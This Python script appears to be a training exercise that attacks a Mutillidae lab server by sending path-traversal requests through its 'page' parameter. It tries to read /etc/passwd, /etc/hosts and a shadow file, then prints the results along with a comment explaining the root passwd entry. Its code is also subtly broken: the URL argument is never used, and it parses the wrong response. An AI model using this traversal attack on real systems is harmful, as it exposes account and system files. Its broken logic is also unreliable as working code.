import requests
from bs4 import BeautifulSoup
import optparse
def request(url):
    try:
        return requests.get(url)
    except requests.exceptions.ConnectionError:
        pass

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="target_url", help="Specify URL, -h for help")
    options, argumants = parser.parse_args()
    if not options.target_url:
        "[-] Please specify URL, -h for help"

    return options.target_url



def get_text_from_webpage(url):
    # Send a GET request to the URL

    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(response.content, 'html.parser')
    blockquote = soup.find('blockquote')
    content = blockquote.get_text(strip=True)
    return content

print("This Tool is allowing to access files or directory outsides the intended directory!")
target_url = "http://192.168.6.131/mutillidae/"
List = ["index.php?page=../../../etc/passwd", "index.php?page=../../../etc/hosts",  "index.php?page=../../../shadow"]
for Link in List:
    test_url = target_url + Link
    print("----"*20)
    print("\n\n" + test_url + "\n")
    response = request(test_url)
    print(response)
    Page = get_text_from_webpage(request(target_url))
    print("\n\n"+Page+"\n\n")

'''
root:x:0:0:root:/root:/bin/bash
In this line, we have the following fields:

username: root
password: x
UID: 0
GID: 0
full_name: root
home_directory: /root
shell: /bin/bash
'''
request(target_url)